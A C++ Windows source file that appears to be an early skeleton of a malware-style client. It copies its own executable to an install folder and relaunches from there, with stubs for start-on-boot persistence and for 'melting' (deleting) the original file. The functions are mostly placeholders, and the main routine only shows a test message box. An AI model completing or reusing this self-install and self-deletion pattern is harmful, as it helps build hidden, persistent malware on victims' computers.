/*

					SETTINGS CAN BE EDITED IN "settings.cpp"

*/


#include "includes.h"

using namespace std;

//TESTFUNC

void testMB(string s)		//TEST FUNCTION
{
	MessageBox(0, s.c_str(), "THIS IS A TEST", 0);
}

//END TESTFUNC



void setLocation()			//sets location(copies file)
{
	if (!directoryExists(installFolder.c_str()))
		if (!CreateDirectory(installFolder.c_str(), NULL))	//tries to create folder		
		{
																						//[MAYBE DO SOMETHING LATER IF IT FAILS - PERHAPS REROUTE INSTALL TO APPDATA]
		}
	CopyFile(currentPath.c_str(), installPath.c_str(), 0);
}



bool locationSet()		//checks if executable is located in install position
{
	if (currentPath == installPath)
		return true;
	else
		return false;
}

bool startupSet()		//checks if executable is starting on boot
{
	return true;
}

bool installed()		//checks if executable is installed properly (location + startup)
{
	if (startupSet() && locationSet())
		return true;
	else
		return false;
}

bool melt()			//deletes old file
{
	return true;
}

void installCheck()		//checks if this run of the program is designated to the install process, then checks whether it should start the installed client
{
	if (installing)
		if (!startOnNextBoot)
		{
			startProcess(installPath.c_str(), meltSelf ? const_cast<char *>(currentPath.c_str()) : NULL);		//CHANGE ARGS TO SMTH DIFFERENT TO SUPPLY MELT PATH (SENDS ARGS ON EXECUTION TO PROVIDE LOCATION OF OLD FILE (THAT IS TO BE MELTED))
		}

}

int init()		//startup of program
{
	currentPath = getCurrentPath();
	installFolder = getInstallFolder();
	installPath = getInstallPath(installFolder);

	if (installSelf)
	{
		if (!locationSet())				//checks if it is at it's destined location (config in settings.h)
		{
			setLocation();
			installing = true;
		}
	}

	

	installCheck();


	return 0;
}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
{
	testMB("test");
	//init();
	return 0;
}